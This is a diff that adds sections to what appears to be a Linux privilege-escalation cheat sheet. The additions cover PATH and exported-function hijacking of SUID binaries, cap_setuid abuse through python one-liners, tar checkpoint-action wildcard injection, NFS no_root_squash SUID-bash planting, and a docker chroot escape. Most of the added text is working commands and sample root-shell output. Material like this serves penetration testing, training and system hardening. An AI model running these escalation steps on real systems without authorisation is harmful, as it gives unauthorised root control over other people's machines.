@@ -131,6 +131,18 @@ You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.
 ./pspy64 -pf -i 1000 
 ```
 
+### Systemd timers
+
+```python
+systemctl list-timers --all
+NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
+Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
+Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
+Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+3 timers listed.
+```
+
 ## SUDO
 
 ```bash
@@ -402,6 +414,136 @@ export PATH=/tmp:$PATH
 ./file_having_SUID_permissions
 ```
 
+## Environmental Variables
+
+#### Example 1
+
+```python
+/usr/local/bin/suid-env
+strings /usr/local/bin/suid-env
+...SNIP...
+.
+.
+.
+service apache2 start
+```
+
+```bash
+echo 'int main() { setuid(0); setgid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
+gcc /tmp/service.c -o /tmp/service
+
+export PATH=/tmp:$PATH
+
+/usr/local/bin/suid_env
+
+root@debian:~#
+```
+
+#### Example 2
+
+```python
+/usr/local/bin/suid-env2
+strings /usr/local/bin/suid-env2
+...SNIP...
+.
+.
+.
+/usr/sbin/service apache2 start
+```
+
+```python
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+export -f /usr/sbin/service
+/usr/local/bin/suid-env2
+.
+.
+.
+root@debian:~#
+```
+
+## Capabilities
+
+You can **search binaries with capabilities** using:
+
+```python
+getcap -r / 2>/dev/null
+.
+.
+/usr/bin/python2.6 = cap_setuid+ep
+```
+
+Having the capability `ep` means the binary has all the capabilities.
+
+```python
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@debian:~#
+```
+
+#### List capabilities of binaries
+
+```python
+╭─swissky@lab ~  
+╰─$ /usr/bin/getcap -r  /usr/bin
+/usr/bin/fping                = cap_net_raw+ep
+/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/bin/rlogin               = cap_net_bind_service+ep
+/usr/bin/ping                 = cap_net_raw+ep
+/usr/bin/rsh                  = cap_net_bind_service+ep
+/usr/bin/rcp                  = cap_net_bind_service+ep
+```
+
+#### Edit capabilities
+
+```bash
+/usr/bin/setcap -r /bin/ping            # remove
+/usr/bin/setcap cap_net_raw+p /bin/ping # add
+```
+
+#### Interesting capabilities
+
+Having the capability =ep means the binary has all the capabilities.
+
+```bash
+$ getcap openssl /usr/bin/openssl 
+openssl=ep
+```
+
+Alternatively the following capabilities can be used in order to upgrade your current privileges.
+
+```bash
+cap_dac_read_search # read anything
+cap_setuid+ep # setuid
+```
+
+Example of privilege escalation with `cap_setuid+ep`
+
+```bash
+$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
+
+$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+sh-5.0# id
+uid=0(root) gid=1000(swissky)
+```
+
+| Capabilities name       | Description                                                                                                                                 |
+| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
+| CAP\_AUDIT\_CONTROL     | Allow to enable/disable kernel auditing                                                                                                     |
+| CAP\_AUDIT\_WRITE       | Helps to write records to kernel auditing log                                                                                               |
+| CAP\_BLOCK\_SUSPEND     | This feature can block system suspends                                                                                                      |
+| CAP\_CHOWN              | Allow user to make arbitrary change to files UIDs and GIDs                                                                                  |
+| CAP\_DAC\_OVERRIDE      | This helps to bypass file read, write and execute permission checks                                                                         |
+| CAP\_DAC\_READ\_SEARCH  | This only bypasses file and directory read/execute permission checks                                                                        |
+| CAP\_FOWNER             | This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file |
+| CAP\_KILL               | Allow the sending of signals to processes belonging to others                                                                               |
+| CAP\_SETGID             | Allow changing of the GID                                                                                                                   |
+| CAP\_SETUID             | Allow changing of the UID                                                                                                                   |
+| CAP\_SETPCAP            | Helps to transferring and removal of current set to any PID                                                                                 |
+| CAP\_IPC\_LOCK          | This helps to lock memory                                                                                                                   |
+| CAP\_MAC\_ADMIN         | Allow MAC configuration or state changes                                                                                                    |
+| CAP\_NET\_RAW           | Use RAW and PACKET sockets                                                                                                                  |
+| CAP\_NET\_BIND\_SERVICE | SERVICE Bind a socket to internet domain privileged ports                                                                                   |
+
 ## Writable files
 
 List world writable files on the system.
@@ -494,9 +636,64 @@ id
 whoami
 ```
 
+#### Tar Wildcard Injection (4th Method)
+
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
+chmod +x runme.sh
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=sh runme.sh
+/tmp/bash -p
+```
+
 #### Resources
 
 {% embed url="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" %}
+
+## NFS Root Squashing
+
+Read the \_ **/etc/exports** \_ file, if you find some directory that is configured as **no\_root\_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.
+
+**no\_root\_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.
+
+**no\_all\_squash:** This is similar to **no\_root\_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no\_all\_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.
+
+## Privilege Escalation
+
+### Remote Exploit
+
+If you have found this vulnerability, you can exploit it:
+
+* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.
+
+```bash
+#Attacker, as root user
+mkdir /tmp/pe
+mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
+cd /tmp/pe
+cp /bin/bash .
+chmod +s bash
+
+#Victim
+cd <SHAREDD_FOLDER>
+./bash -p #ROOT shell
+```
+
+* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/payloads-to-execute#c)).
+
+```bash
+#Attacker, as root user
+gcc payload.c -o payload
+mkdir /tmp/pe
+mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
+cd /tmp/pe
+cp /tmp/payload .
+chmod +s payload
+
+#Victim
+cd <SHAREDD_FOLDER>
+./payload #ROOT shell
+```
 
 ## Docker
 
@@ -505,7 +702,7 @@ whoami
 {% embed url="https://gtfobins.github.io/gtfobins/docker/" %}
 
 ```bash
-docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
 ```
 
 ## Restricted Shell
